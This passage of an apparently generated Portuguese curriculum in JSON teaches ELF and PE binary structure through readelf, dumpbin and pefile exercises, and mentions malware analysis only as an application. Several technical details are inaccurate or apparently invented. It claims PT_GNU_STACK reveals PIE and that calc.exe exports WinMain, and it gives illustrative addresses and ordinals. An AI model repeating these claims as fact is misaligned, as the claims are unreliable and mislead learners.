                                    "Registre sh_addr (endereço virtual), sh_offset (no arquivo), sh_size.",
                                    "Identifique seções sem arquivo (sh_type=SHT_NOBITS como .bss).",
                                    "Use readelf -S --wide hello e objdump -h hello para comparação."
                                  ],
                                  "verification": "Descreva 4 seções principais (.text, .data, .bss, .rodata) com sh_flags e sh_offset.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Binário hello",
                                    "readelf",
                                    "objdump"
                                  ],
                                  "tips": "Seções são para linking; use .symtab para nomes se necessário.",
                                  "learningObjective": "Entender granularidade das seções dentro de segmentos.",
                                  "commonMistakes": [
                                    ".bss confundida com .data (zero-init)",
                                    "Ignorar sh_link/sh_info para dependências",
                                    "sh_addr=0 em seções não carregadas"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Mapeamento entre Program e Section Headers",
                                  "subSteps": [
                                    "Sobreponha ranges: compare p_offset/p_filesz de PT_LOAD com sh_offset/sh_size de seções.",
                                    "Identifique qual PT_LOAD contém .text (executável, r+x) e .data (rw).",
                                    "Use readelf -l -S hello | grep para filtrar e mapear manualmente.",
                                    "Visualize com objdump -x hello | grep 'file format elf' para headers combinados.",
                                    "Teste carregamento com gdb hello e info proc mappings para validar vaddrs."
                                  ],
                                  "verification": "Crie diagrama simples mostrando 1 segmento PT_LOAD cobrindo .text + .rodata.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Binário hello",
                                    "readelf",
                                    "objdump",
                                    "gdb"
                                  ],
                                  "tips": "Segmentos agregam seções alinhadas; verifique alinhamentos de página (0x1000).",
                                  "learningObjective": "Mapear como seções formam segmentos para execução.",
                                  "commonMistakes": [
                                    "Assumir 1:1 mapeamento (múltiplas seções por segmento)",
                                    "Ignorar padding/align",
                                    "Não validar com runtime como gdb"
                                  ]
                                }
                              ],
                              "practicalExample": "Baixe /bin/ls de um sistema Linux. Execute readelf -l /bin/ls: note PT_LOAD[0] (p_offset=0x0, p_vaddr=0x401000, p_filesz=18432) contendo .text (sh_offset dentro do range). Compare com readelf -S /bin/ls: .text em sh_offset=0x430, sh_addr=0x401430. Explique por que p_vaddr difere de sh_addr inicial.",
                              "finalVerifications": [
                                "Listar todos PT_LOAD com p_type=1, p_flags e ranges corretos.",
                                "Identificar seções .text/.data/.bss e seus sh_type/sh_flags.",
                                "Mapear pelo menos 2 seções para segmentos correspondentes.",
                                "Explicar BSS (p_filesz < p_memsz, sh_size mas sem dados no arquivo).",
                                "Validar vaddrs com gdb info proc mappings.",
                                "Detectar se binário é PIC/PIE via PT_GNU_STACK."
                              ],
                              "assessmentCriteria": [
                                "Precisão na interpretação de p_offset vs p_vaddr (90% correção).",
                                "Correto mapeamento seção-segmento com evidências de ranges.",
                                "Explicação clara de flags (ex: PF_R/PF_W/PF_X em p_flags).",
                                "Identificação de erros comuns como BSS handling.",
                                "Uso integrado de readelf/objdump sem comandos errôneos.",
                                "Diagrama ou tabela visual de mapeamento."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: mmap e carregamento de segmentos pelo loader.",
                                "Arquitetura/Assembly: Alinhamentos e permissões de memória (NX bit).",
                                "Segurança: ASLR impacta p_vaddr; análise para exploits ROP.",
                                "Compiladores: Como gcc organiza seções via linker scripts.",
                                "Programação em C: Atributos __attribute__((section)) para custom seções."
                              ],
                              "realWorldApplication": "Em análise de malware reversa, examine ELF malicioso para identificar payloads em .data ou injeções em .text; em debugging de crashes, valide mapeamentos para stack/heap overflows; otimização de binários em embedded systems para reduzir tamanho de segmentos."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.2.1.3",
                            "name": "Explorar a Tabela de Símbolos e String Tables em ELF",
                            "description": "Interpretar a seção .symtab e .strtab, identificando símbolos globais, locais, funções e variáveis, utilizando comandos como readelf -s para mapear endereços e tipos de símbolos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Conceitos de .symtab e .strtab em ELF",
                                  "subSteps": [
                                    "Leia a documentação oficial do ELF sobre seções de símbolos (symtab) e strings (strtab).",
                                    "Identifique que .symtab armazena metadados de símbolos como nome, tipo, binding e valor (endereço).",
                                    "Entenda que .strtab contém as strings de nomes referenciadas por índices na .symtab.",
                                    "Estude os tipos de símbolos: STT_FUNC (funções), STT_OBJECT (variáveis), STB_GLOBAL (globais) vs STB_LOCAL (locais).",
                                    "Revise o cabeçalho da seção ELF para offsets de .symtab e .strtab."
                                  ],
                                  "verification": "Resuma em suas palavras o propósito de cada seção e liste 3 diferenças entre símbolos globais e locais.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação ELF (elf(5) man page)",
                                    "Diagrama de estrutura ELF"
                                  ],
                                  "tips": "Use um editor de texto para anotar offsets e estruturas para referência rápida.",
                                  "learningObjective": "Dominar os conceitos fundamentais das tabelas de símbolos e strings em ELF.",
                                  "commonMistakes": [
                                    "Confundir .symtab com .dynsym (símbolos dinâmicos)",
                                    "Ignorar o papel do índice st_name na ligação com .strtab"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Visualizar as Seções .symtab e .strtab com readelf",
                                  "subSteps": [
                                    "Instale ou verifique a disponibilidade do binutils (incluindo readelf).",
                                    "Execute 'readelf -S binary.elf' para listar todas as seções e localizar .symtab e .strtab.",
                                    "Use 'readelf -s binary.elf' para dump completo da tabela de símbolos.",
                                    "Execute 'readelf --string-dump=.strtab binary.elf' para visualizar a tabela de strings.",
                                    "Compare os índices st_name na saída de -s com as strings em .strtab."
                                  ],
                                  "verification": "Capture a saída de readelf -s e identifique pelo menos 5 símbolos com seus offsets correspondentes em .strtab.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Ferramenta readelf (binutils)",
                                    "Binário ELF de exemplo (ex: compilado de um programa C simples)"
                                  ],
                                  "tips": "Redirecione a saída para um arquivo: readelf -s binary.elf > symtab.txt para análise offline.",
                                  "learningObjective": "Habilitar a extração e visualização inicial das tabelas de símbolos.",
                                  "commonMistakes": [
                                    "Usar objdump em vez de readelf para ELF puro",
                                    "Esquecer flags como -s ou --string-dump"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Interpretar Tipos, Bindings e Valores de Símbolos",
                                  "subSteps": [
                                    "Analise as colunas de readelf -s: Num, Value, Size, Ndx, Type, Bind, Vis, Nome.",
                                    "Classifique símbolos por TYPE: FUNC vs OBJECT, e BIND: GLOBAL vs LOCAL.",
                                    "Mapeie o campo Value para endereços virtuais e Size para comprimento.",
                                    "Identifique seções Ndx (ex: .text para funções, .data para variáveis).",
                                    "Diferencie símbolos undefined (UND) de definidos."
                                  ],
                                  "verification": "Crie uma tabela manual listando 10 símbolos com classificação de tipo, binding e seção associada.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Saída de readelf -s salva",
                                    "Planilha ou editor para tabulação"
                                  ],
                                  "tips": "Procure padrões: funções globais têm TYPE=FUNC e BIND=GLOBAL; variáveis locais são BIND=LOCAL.",
                                  "learningObjective": "Desenvolver habilidade para decodificar metadados de símbolos precisamente.",
                                  "commonMistakes": [
                                    "Confundir Value com endereço físico",
                                    "Ignorar VIS (visibilidade) para símbolos hidden"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar Análise em um Binário Real e Mapear Endereços",
                                  "subSteps": [
                                    "Compile um programa C simples com funções e variáveis globais/locais.",
                                    "Execute readelf -s no binário e mapeie símbolos para endereços.",
                                    "Use 'readelf -h' para confirmar arquitetura e entry point, correlacionando com símbolos.",
                                    "Simule engenharia reversa: identifique main() e variáveis usadas.",
                                    "Compare com gdb 'info functions' para validação cruzada."
                                  ],
                                  "verification": "Gere um relatório descrevendo 3 funções globais e 2 variáveis com endereços e tipos corretos.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "GCC para compilar C",
                                    "GDB para verificação",
                                    "Binário ELF customizado"
                                  ],
                                  "tips": "Use -rdynamic no link para mais símbolos visíveis; flags como -fno-builtin para controle.",
                                  "learningObjective": "Integrar análise de símbolos em fluxos de reverse engineering práticos.",
                                  "commonMistakes": [
                                    "Analisar binários stripped (sem symtab)",
                                    "Não considerar relocação em executáveis dinâmicos"
                                  ]
                                }
                              ],
                              "practicalExample": "Compile 'hello.c' com gcc -g hello.c -o hello.elf. Execute readelf -s hello.elf, identifique símbolo 'main' (Value: 0x40113e, Type: FUNC, Bind: GLOBAL), localize seu nome via st_name=42 em .strtab ('main'), e mapeie para seção .text (Ndx=12).",
                              "finalVerifications": [
                                "Lista corretamente todos os símbolos globais de um binário ELF usando readelf -s.",
                                "Mapeia índices st_name para strings exatas em .strtab.",
                                "Classifica pelo menos 80% dos símbolos por tipo (FUNC/OBJECT) e binding (GLOBAL/LOCAL).",
                                "Explica o papel de Value e Size em 3 símbolos diferentes.",
                                "Identifica seções associadas (Ndx) para funções vs variáveis.",
                                "Diferencia .symtab de .dynsym em um binário dinâmico."
                              ],
                              "assessmentCriteria": [
                                "Precisão na interpretação de colunas readelf (90%+ acurácia).",
                                "Capacidade de mapear endereços e tipos sem erros em exemplos práticos.",
                                "Profundidade na distinção de símbolos locais/globais e funções/variáveis.",
                                "Uso correto de comandos readelf com flags apropriadas.",
                                "Relatório claro com tabelas e correlações .symtab/.strtab.",
                                "Aplicação em binário customizado com análise independente."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly: Entender linkage de símbolos globais/locais.",
                                "Sistemas Operacionais: Gerenciamento de símbolos em loaders ELF.",
                                "Segurança Computacional: Identificação de entry points em malware.",
                                "Engenharia de Software: Debugging e symbol resolution em builds.",
                                "Análise de Binários: Integração com ferramentas como Ghidra/IDA Pro."
                              ],
                              "realWorldApplication": "Em análise de malware, mapear símbolos em binários ELF para identificar funções maliciosas como backdoors (ex: símbolo 'connect_back' em GLOBAL FUNC); em debugging de crashes, correlacionar endereços de stack traces com símbolos via .symtab para root cause analysis em servidores Linux."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.6.2.2",
                        "name": "Estrutura do Formato Executável PE",
                        "description": "Compreensão da organização interna dos arquivos PE (Portable Executable), utilizados em sistemas Windows, incluindo DOS Header, NT Headers, seções e tabelas de exportação/importação.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.2.2.1",
                            "name": "Identificar e interpretar os Headers PE",
                            "description": "Analisar o DOS Header (MZ signature), PE Header (Signature 'PE\\0\\0'), File Header (Machine, NumberOfSections, etc.) e Optional Header (Magic, AddressOfEntryPoint, ImageBase, etc.) com ferramentas como CFF Explorer ou pefile.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar ambiente e abrir arquivo PE com ferramentas",
                                  "subSteps": [
                                    "Baixar e instalar CFF Explorer ou instalar biblioteca pefile via pip",
                                    "Obter um executável PE de exemplo (ex: notepad.exe do Windows)",
                                    "Abrir o arquivo no CFF Explorer ou carregar no Python com pefile",
                                    "Visualizar a visão geral do cabeçalho DOS",
                                    "Confirmar que o arquivo é um PE válido navegando pela interface"
                                  ],
                                  "verification": "Ferramenta carrega o arquivo sem erros e exibe estrutura DOS Header visível",
                                  "estimatedTime": "15 minutes",
                                  "materials": [
                                    "CFF Explorer (gratuito)",
                                    "pefile Python library",
                                    "Exemplo de .exe PE (notepad.exe)"
                                  ],
                                  "tips": "Use um VM Windows para segurança ao lidar com binários desconhecidos",
                                  "learningObjective": "Preparar ferramentas para análise segura de headers PE",
                                  "commonMistakes": [
                                    "Abrir arquivos maliciosos sem sandbox",
                                    "Confundir ELF com PE",
                                    "Não instalar dependências corretas"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e interpretar o DOS Header (MZ signature)",
                                  "subSteps": [
                                    "Localizar os primeiros 2 bytes: 'MZ' ou 4D 5A em hex",
                                    "Analisar offset para PE Header (e_lfanew, geralmente em 0x3C)",
                                    "Verificar campos como e_magic, e_cblp, e_cp para relocação",
                                    "Usar CFF Explorer para navegar ao DOS Stub e confirmar stub 'This program cannot be run in DOS mode'",
                                    "Em pefile: print(pe.DOS_HEADER.e_magic) e pe.DOS_HEADER.e_lfanew"
                                  ],
                                  "verification": "Identifica corretamente 'MZ' e lê e_lfanew apontando para PE Header",
                                  "estimatedTime": "20 minutes",
                                  "materials": [
                                    "CFF Explorer",
                                    "Python com pefile",
                                    "Hex editor opcional como HxD"
                                  ],
                                  "tips": "MZ é herança do MS-DOS; e_lfanew é crucial para pular ao PE",
                                  "learningObjective": "Reconhecer assinatura DOS e extrair offset para PE Header",
                                  "commonMistakes": [
                                    "Ignorar DOS Header achando irrelevante",
                                    "Ler e_lfanew errado devido a endianness",
                                    "Confundir com outros stubs"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar PE Header e File Header",
                                  "subSteps": [
                                    "Navegar ao offset e_lfanew: confirmar 'PE\\0\\0' (50 45 00 00)",
                                    "Interpretar File Header: Machine (0x014c para x86), NumberOfSections, TimeDateStamp, Characteristics",
                                    "Em CFF Explorer: Expandir NT Headers > File Header e anotar valores",
                                    "Com pefile: print(pe.FILE_HEADER.Machine, pe.FILE_HEADER.NumberOfSections)",
                                    "Verificar Characteristics como IMAGE_FILE_EXECUTABLE_IMAGE ou DLL"
                                  ],
                                  "verification": "Lista corretamente Machine, NumberOfSections e pelo menos 3 Characteristics",
                                  "estimatedTime": "25 minutes",
                                  "materials": [
                                    "CFF Explorer",
                                    "pefile",
                                    "Documentação PE Format (Microsoft)"
                                  ],
                                  "tips": "Machine 0x8664 é x64; NumberOfSections indica .text, .data etc.",
                                  "learningObjective": "Extrair metadados chave do PE e File Headers",
                                  "commonMistakes": [
                                    "Não validar assinatura PE\\0\\0",
                                    "Confundir File Header com Optional",
                                    "Ignorar TimeDateStamp para timestamps de compilação"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Interpretar Optional Header e campos principais",
                                  "subSteps": [
                                    "Localizar Optional Header após File Header: Magic (0x10B para PE32, 0x20B PE32+)",
                                    "Analisar AddressOfEntryPoint (RVA do OEP), ImageBase, SectionAlignment, FileAlignment",
                                    "Em CFF Explorer: Ver Data Directories (Export, Import, etc.)",
                                    "Com pefile: print(pe.OPTIONAL_HEADER.Magic, pe.OPTIONAL_HEADER.AddressOfEntryPoint)",
                                    "Mapear RVA para offsets reais usando SectionAlignment"
                                  ],
                                  "verification": "Identifica Magic correto, OEP RVA e ImageBase, com pelo menos 2 Data Directories",
                                  "estimatedTime": "30 minutes",
                                  "materials": [
                                    "CFF Explorer",
                                    "pefile",
                                    "PE specification PDF"
                                  ],
                                  "tips": "ImageBase padrão 0x400000; OEP é onde loader salta após fixups",
                                  "learningObjective": "Compreender layout de memória e entry point do Optional Header",
                                  "commonMistakes": [
                                    "Confundir RVA com VA sem base",
                                    "Ignorar PE32 vs PE32+",
                                    "Não checar Data Directories para imports"
                                  ]
                                }
                              ],
                              "practicalExample": "Usando notepad.exe: Confirme MZ em bytes 0-1, e_lfanew=0x80, PE signature, Machine=0x014c (x86), Magic=0x10B (PE32), AddressOfEntryPoint=0xXXXX (RVA). Liste 5 seções como .text e interprete ImageBase=0x400000.",
                              "finalVerifications": [
                                "Identifica corretamente MZ, PE\\0\\0 signatures",
                                "Extrai e interpreta e_lfanew, Machine, NumberOfSections",
                                "Lista Magic, AddressOfEntryPoint, ImageBase do Optional Header",
                                "Explica pelo menos 3 Characteristics do File Header",
                                "Mapeia uma Data Directory (ex: Import Table RVA)",
                                "Usa tanto CFF Explorer quanto pefile sem erros"
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de todas signatures e offsets chave (90%+ correto)",
                                "Interpretação correta de pelo menos 80% dos campos listados",
                                "Uso efetivo de ferramentas com screenshots ou outputs",
                                "Explicação clara de implicações (ex: Machine para arch, OEP para análise)",
                                "Identificação de anomalias potenciais em binários packed",
                                "Tempo total dentro de 90-120 minutes com documentação"
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly: Entender como linker gera headers",
                                "Sistemas Operacionais: Mecanismo de carregamento PE pelo Windows Loader",
                                "Criptografia: Análise de malware com headers modificados",
                                "Redes: Detecção de payloads em tráfego com PE stubs",
                                "Forense Digital: Timestamps e Characteristics em investigações"
                              ],
                              "realWorldApplication": "Em segurança cibernética, analistas de malware usam isso para dissecar trojans (ex: identificar OEP para unpacking), engenheiros de RE para patching binários, e desenvolvedores para debugar loaders personalizados em ferramentas anti-vírus."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.2.2.2",
                            "name": "Analisar Seções e Data Directories em PE",
                            "description": "Examinar as seções (.text, .rdata, .data, .rsrc) via Section Table (VirtualAddress, VirtualSize, RawDataAddress) e Data Directories (Export Table, Import Table, Resource Table) para entender o layout de memória.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Localizar e Ler a Section Table no Cabeçalho PE",
                                  "subSteps": [
                                    "Abra um arquivo PE de exemplo (como um executável 'Hello World' compilado em C) usando uma ferramenta como CFF Explorer ou pefile em Python.",
                                    "Navegue até o NT Headers > Optional Header e note o campo NumberOfSections, que indica quantas seções existem.",
                                    "Calcule o offset da Section Table: após o fim do Optional Header (SizeOfOptionalHeader bytes após o Optional Header offset).",
                                    "Leia cada header de seção (40 bytes cada): Name (8 bytes), VirtualSize, VirtualAddress (RVA), SizeOfRawData, PointerToRawData, Characteristics.",
                                    "Registre os valores para as seções principais: .text, .rdata, .data, .rsrc."
                                  ],
                                  "verification": "Confirme que você pode listar todas as seções com seus VirtualAddress, VirtualSize e PointerToRawData corretamente em um diagrama ou tabela.",
                                  "estimatedTime": "45 minutes",
                                  "materials": [
                                    "Arquivo PE simples (ex: hello.exe)",
                                    "CFF Explorer ou PE-bear",
                                    "Hex editor (HxD)",
                                    "Documentação PE: learn.microsoft.com/en-us/windows/win32/debug/pe-format"
                                  ],
                                  "tips": "Lembre-se: VirtualAddress é um RVA relativo à ImageBase; PointerToRawData é offset no arquivo no disco.",
                                  "learningObjective": "Compreender a estrutura e localização da Section Table no formato PE.",
                                  "commonMistakes": [
                                    "Confundir SizeOfOptionalHeader com NumberOfSections",
                                    "Ignorar o alinhamento: VirtualAddress é alinhado a 0x1000 (página), PointerToRawData a FileAlignment"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Propriedades das Seções Principais",
                                  "subSteps": [
                                    "Para .text (código executável): Verifique Characteristics (CODE, EXECUTE, READ); note VirtualSize vs SizeOfRawData.",
                                    "Para .rdata (dados somente leitura, strings): Confirme READONLY flag; examine PointerToRawData para dump de strings.",
                                    "Para .data (dados inicializados): Verifique READ/WRITE; compare tamanhos virtuais e raw.",
                                    "Para .rsrc (recursos: ícones, dialogs): Localize via Resource Table; dump conteúdo usando ferramenta.",
                                    "Crie uma tabela comparando VirtualAddress, VirtualSize, PointerToRawData e Characteristics para cada seção."
                                  ],
                                  "verification": "Dump o conteúdo de pelo menos uma seção (ex: strings de .rdata) e confirme que corresponde ao esperado.",
                                  "estimatedTime": "60 minutes",
                                  "materials": [
                                    "Mesmo arquivo PE do Step 1",
                                    "Strings dumper ou hex viewer",
                                    "Referência de Characteristics flags: IMAGE_SCN_CNT_CODE, etc."
                                  ],
                                  "tips": "Use filtros em CFF Explorer para navegar seções diretamente; sempre verifique flags em Characteristics para permissões de memória.",
                                  "learningObjective": "Identificar e interpretar propriedades chave das seções comuns em PE.",
                                  "commonMistakes": [
                                    "Assumir VirtualSize == SizeOfRawData (alinhamentos diferem)",
                                    "Ignorar seções opcionais como .pdata ou .reloc"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Examinar Data Directories no Optional Header",
                                  "subSteps": [
                                    "No Optional Header, localize o array DataDirectory (16 entradas, cada 8 bytes: RVA + Size).",
                                    "Foco em principais: Export Table (0: RVA da Export Directory), Import Table (1), Resource Table (2), Exception Table (3).",
                                    "Para cada: Calcule offset no arquivo (RVA + ImageBase para memória, mas RVA para seção).",
                                    "Parse Export Table: Name, Ordinal/Base, AddressOfFunctions; liste funções exportadas.",
                                    "Parse Import Table: Liste DLLs e funções importadas; Resource Table: Estrutura de resources."
                                  ],
                                  "verification": "Liste todas as Data Directories não-zero com seus RVA e Size; parse pelo menos uma (ex: Imports).",
                                  "estimatedTime": "50 minutes",
                                  "materials": [
                                    "Ferramenta PE viewer com parsing (CFF Explorer > Directories)",
                                    "PE specification para estruturas de Export/Import"
                                  ],
                                  "tips": "Data Directories são RVAs dentro de seções específicas (ex: Resources em .rsrc); use RVA to Raw converter nas ferramentas.",
                                  "learningObjective": "Mapear e interpretar Data Directories para entender dependências e recursos.",
                                  "commonMistakes": [
                                    "Confundir RVA de Directory com localização da seção",
                                    "Ignorar directories vazias (Size=0)"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Mapear Seções e Directories para Layout de Memória",
                                  "subSteps": [
                                    "Some ImageBase (do Optional Header) aos VirtualAddress para obter endereços absolutos de memória.",
                                    "Desenhe um diagrama: Posicione seções por VirtualAddress (ex: .text em 0x1000, .rdata após).",
                                    "Marque Data Directories sobrepostas nas seções (ex: Resource Table RVA dentro .rsrc).",
                                    "Simule carregamento: Como loader mapeia RawData para VirtualAddress no processo.",
                                    "Compare layout em disco (PointersToRawData) vs memória."
                                  ],
                                  "verification": "Crie e valide um diagrama que mostre layout correto, confirmando com debugger (x64dbg attach a processo).",
                                  "estimatedTime": "40 minutes",
                                  "materials": [
                                    "Papel/diagrama tool (draw.io)",
                                    "Debugger como x64dbg ou WinDbg",
                                    "Process Hacker para ver módulos carregados"
                                  ],
                                  "tips": "Ferramentas como PE Explorer mostram mapa visual; teste com 'dumpbin /headers' no Visual Studio.",
                                  "learningObjective": "Visualizar como PE é organizado em memória via seções e directories.",
                                  "commonMistakes": [
                                    "Esquecer ImageBase (padrão 0x400000, mas ASLR randomiza)",
                                    "Não considerar gaps de padding entre seções"
                                  ]
                                }
                              ],
                              "practicalExample": "Baixe notepad.exe (Windows nativo). Abra no CFF Explorer: Vá para Sections > .text (VirtualAddress 0x1000, Size ~100KB), .rdata (strings como 'Notepad'), Data Directories > Import Table (kernel32.dll funções). Desenhe mapa mostrando .text seguido de .rdata em memória virtual.",
                              "finalVerifications": [
                                "Listar corretamente 4+ seções com VirtualAddress, VirtualSize, PointerToRawData.",
                                "Identificar RVA e Size de pelo menos 3 Data Directories (Export, Import, Resource).",
                                "Explicar diferença entre layout em arquivo (raw offsets) e memória (RVA + ImageBase).",
                                "Dump e interpretar conteúdo de .rdata (strings) e Import Table (DLLs).",
                                "Desenhar diagrama preciso do layout PE sem erros de alinhamento.",
                                "Confirmar flags de Characteristics para permissões de seção."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de offsets e tamanhos (100% match com ferramenta).",
                                "Profundidade na explicação de RVA vs Raw e role no carregamento.",
                                "Qualidade do diagrama/layout (claro, rotulado, escalado corretamente).",
                                "Capacidade de parse manual ou via tool de pelo menos uma Directory.",
                                "Identificação de erros comuns evitados (ex: alinhamentos).",
                                "Aplicação prática: Análise de exe real com evidências."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Memory management e virtual address spaces.",
                                "Programação: Linking e como compiler gera seções (.text de código, .data de variáveis).",
                                "Segurança Computacional: Malware hiding em seções custom ou directories obfuscadas.",
                                "Redes: Análise de droppers que usam Resources para payloads.",
                                "Arquitetura de Computadores: Endianness e alinhamentos em headers PE."
                              ],
                              "realWorldApplication": "Em análise de malware reversa, identificar código shellcode em .text, strings obfuscadas em .rdata, DLLs maliciosas em Imports, ou payloads em Resources (.rsrc) para detecção e desarmamento."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.2.2.3",
                            "name": "Explorar Tabelas de Símbolos, Exportações e Importações em PE",
                            "description": "Interpretar a Export Address Table (EAT), Import Address Table (IAT) e tabelas de símbolos para identificar funções exportadas, dependências DLL e endereços de chamadas dinâmicas usando ferramentas como dumpbin ou PEiD.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar Ambiente e Obter Arquivo PE de Exemplo",
                                  "subSteps": [
                                    "Instale o Visual Studio Community (inclui dumpbin) ou use Developer Command Prompt.",
                                    "Baixe e instale PEiD para análise visual de PE files.",
                                    "Obtenha um executável PE simples, como calc.exe de C:\\Windows\\System32.",
                                    "Copie o arquivo para uma pasta de trabalho e verifique integridade com PEiD."
                                  ],
                                  "verification": "Ambiente pronto: dumpbin acessível via prompt e PEiD executável; arquivo PE aberto sem erros.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Visual Studio",
                                    "PEiD",
                                    "calc.exe ou kernel32.dll"
                                  ],
                                  "tips": "Use Developer Command Prompt for VS para dumpbin diretamente.",
                                  "learningObjective": "Configurar ferramentas essenciais para análise PE.",
                                  "commonMistakes": [
                                    "Usar prompt comum em vez de Developer Prompt (dumpbin não encontrado)",
                                    "Escolher arquivo corrompido ou não-PE"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Export Address Table (EAT) com dumpbin",
                                  "subSteps": [
                                    "Abra Developer Command Prompt e navegue para pasta do arquivo.",
                                    "Execute: dumpbin /exports calc.exe > exports.txt",
                                    "Abra exports.txt e identifique seções: Name, Ordinal, RVA e Hint.",
                                    "Liste 5 funções exportadas principais e seus RVAs.",
                                    "Compare com documentação MSDN para funções como WinMain."
                                  ],
                                  "verification": "Arquivo exports.txt gerado com lista de funções exportadas e RVAs corretos.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "dumpbin",
                                    "calc.exe",
                                    "Editor de texto"
                                  ],
                                  "tips": "Para DLLs como kernel32.dll, exports são mais ricas; use /exports /summary para visão geral.",
                                  "learningObjective": "Interpretar EAT para identificar funções exportadas e endereços.",
                                  "commonMistakes": [
                                    "Confundir RVA (Relative Virtual Address) com endereço absoluto",
                                    "Ignorar ordinals para lookup rápido"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Import Address Table (IAT) e Dependências DLL",
                                  "subSteps": [
                                    "Execute: dumpbin /imports calc.exe > imports.txt",
                                    "Abra imports.txt e liste DLLs dependentes (e.g., kernel32.dll, user32.dll).",
                                    "Identifique funções importadas por nome e hint (e.g., CreateFileA).",
                                    "Note thunks: IAT pointers resolvidos em runtime.",
                                    "Use dumpbin /dependents para lista rápida de DLLs."
                                  ],
                                  "verification": "imports.txt mostra DLLs e funções importadas corretamente listadas.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "dumpbin",
                                    "calc.exe"
                                  ],
                                  "tips": "Filtre por DLL específica: dumpbin /imports /dllname:kernel32.dll calc.exe.",
                                  "learningObjective": "Mapear dependências e chamadas dinâmicas via IAT.",
                                  "commonMistakes": [
                                    "Não distinguir imports por ordinal vs. nome",
                                    "Ignorar imports atrasadas (delay-load)"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Explorar Tabelas de Símbolos e Correlacionar Dados",
                                  "subSteps": [
                                    "Execute: dumpbin /symbols calc.exe > symbols.txt (se debug symbols presentes).",
                                    "Use PEiD para visualizar headers e tabelas graficamente.",
                                    "Correlacione EAT/IAT: trace uma import (e.g., MessageBoxA) de user32.dll.",
                                    "Identifique endereços de chamadas dinâmicas em um disassembler como IDA Free.",
                                    "Documente funções exportadas usadas por imports."
                                  ],
                                  "verification": "symbols.txt ou PEiD mostra símbolos; relatório correlaciona 3+ funções entre EAT/IAT.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "dumpbin",
                                    "PEiD",
                                    "IDA Free (opcional)"
                                  ],
                                  "tips": "Para symbols completos, use PDB files; PEiD destaca seções PE visualmente.",
                                  "learningObjective": "Integrar análise de símbolos, exports e imports para visão completa.",
                                  "commonMistakes": [
                                    "Assumir todos PEs têm symbols (stripped comuns em releases)",
                                    "Não converter RVA para offsets de arquivo"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Interpretar e Verificar Chamadas Dinâmicas",
                                  "subSteps": [
                                    "Simule carregamento PE: calcule VA = ImageBase + RVA para uma export.",
                                    "Use PEiD ou dumpbin /headers para ImageBase e seções.",
                                    "Trace uma chamada: encontre import em IAT, resolva para export em DLL.",
                                    "Teste com debugger como x64dbg: set breakpoint em import.",
                                    "Gere relatório resumindo funções, DLLs e potenciais hooks."
                                  ],
                                  "verification": "Relatório final lista 5+ itens com endereços corretos e explicações.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "PEiD",
                                    "x64dbg",
                                    "dumpbin outputs"
                                  ],
                                  "tips": "ImageBase padrão é 0x400000; verifique Optional Header.",
                                  "learningObjective": "Aplicar conhecimento para identificar e verificar chamadas runtime.",
                                  "commonMistakes": [
                                    "Esquecer ASLR rebasa ImageBase",
                                    "Não validar com debugger"
                                  ]
                                }
                              ],
                              "practicalExample": "Analise kernel32.dll: dumpbin /exports revela LoadLibraryA (ordinal 411, RVA 0x12A50). Em calc.exe, /imports mostra import de kernel32.dll com thunks para GetProcAddress. Correlacione para ver como calc carrega DLLs dinamicamente.",
                              "finalVerifications": [
                                "Lista precisa de 5+ funções exportadas com RVAs.",
                                "Identificação correta de 3+ DLLs dependentes e suas funções importadas.",
                                "Explicação de thunks em IAT e resolução runtime.",
